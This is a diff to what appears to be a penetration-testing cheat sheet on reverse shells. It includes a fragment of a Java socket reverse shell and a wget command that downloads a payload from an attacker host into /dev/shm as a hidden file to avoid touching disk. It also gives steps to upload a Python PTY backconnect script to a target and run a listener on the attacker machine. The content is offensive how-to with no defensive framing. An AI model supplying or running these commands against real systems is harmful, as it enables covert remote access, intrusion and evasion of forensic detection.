@@ -59,4 +59,12 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 For getting a revershell in shared memory so as to not touch hard drive use Linux Shared Memory -
 
-wget IP:port/reverse.py -O /dev/shm/.rev.py 
+'wget IP:port/reverse.py -O /dev/shm/.rev.py'
+
+Python reverse shell - https://github.com/infodox/python-pty-shells
+
+Upload tcp_pty_backconnect.py to target (/dev/shm or /tmp or wherever) [CHANGE IP AND PORT]
+Run listener on attacker machine - tcp_pty_shell_handler.py -b IP:port 
+
+
+
